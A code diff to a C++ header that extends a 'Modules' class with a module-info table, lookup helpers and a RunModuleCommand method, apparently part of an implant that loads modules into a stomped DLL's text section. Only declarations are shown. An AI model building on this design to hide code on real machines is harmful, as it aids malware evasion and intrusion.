@@ -11,10 +11,19 @@
 
 #define PAGE_ALIGN(x) (((SIZE_T)(x) + 0xFFF) & ~(SIZE_T)0xFFF);
 
+
+typedef struct {
+	INT32 id;
+	PVOID EntryPoint;
+	SIZE_T ModuleSizeInMemory;
+} ModuleInformation;
+
+
 class Modules {
 private:
 	INT64 LoadModulesBitMap;
 	BOOL IsStompedDllLoaded;
+	ModuleInformation ModuleInfos[10]{};
 
 
 	PVOID StompedDllText;
@@ -22,6 +31,10 @@ private:
 	PVOID TextSectionIndex;
 
 	PVOID ReserveArena(SIZE_T size);
+	void UpdateBitField(INT32 Bit);
+	ModuleInformation* FindFreeModInfo();
+	ModuleInformation* FindModInfoEntry(INT32 needed);
+
 	
 	
 
@@ -31,12 +44,14 @@ public:
 		if ( ! ptr ) { return NULL; }
 		return ptr;
 	}
+	
 
-	//Modules() { this->LoadModulesBitMap = 0; /*this->IsStompedDllLoaded = FALSE;*/ }
 	BOOL IsModuleLoaded(INT32 bit);
 	BOOL LoadModule(PBYTE Module, SIZE_T ModuleSize, INT32 ModuleBit);
 	BOOL LoadStompedDll( );
 	BOOL GetStompedDllText(PVOID DllBase);
+	BOOL RunModuleCommand(INT32 ModuleBit);
+	
 
 	INT64 GetLoadedModulesBitMap();
 
